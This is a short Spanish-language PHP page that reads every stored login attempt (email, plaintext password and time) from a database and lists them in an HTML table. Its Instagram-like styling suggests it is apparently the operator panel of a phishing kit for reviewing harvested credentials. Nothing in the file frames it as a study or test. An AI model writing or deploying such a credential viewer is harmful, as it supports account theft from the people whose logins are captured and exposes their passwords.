<?php
require_once 'config.php';

// Obtener todos los intentos de inicio de sesión
$stmt = $conn->query("SELECT email, password, attempt_time FROM login_attempts ORDER BY attempt_time DESC");
$attempts = $stmt->fetch_all(MYSQLI_ASSOC);
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Intentos de Inicio de Sesión</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            background: #fafafa;
        }
        h1 {
            color: #262626;
            margin-bottom: 20px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
        }
        th, td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #dbdbdb;
        }
        th {
            background: #f5f5f5;
            color: #262626;
        }
        tr:hover {
            background: #f9f9f9;
        }
    </style>
</head>
<body>
    <h1>Intentos de Inicio de Sesión</h1>
    <table>
        <tr>
            <th>Correo Electrónico</th>
            <th>Contraseña</th>
            <th>Fecha y Hora</th>
        </tr>
        <?php foreach ($attempts as $attempt): ?>
            <tr>
                <td><?php echo htmlspecialchars($attempt['email']); ?></td>
                <td><?php echo htmlspecialchars($attempt['password']); ?></td>
                <td><?php echo htmlspecialchars($attempt['attempt_time']); ?></td>
            </tr>
        <?php endforeach; ?>
    </table>
</body>
</html>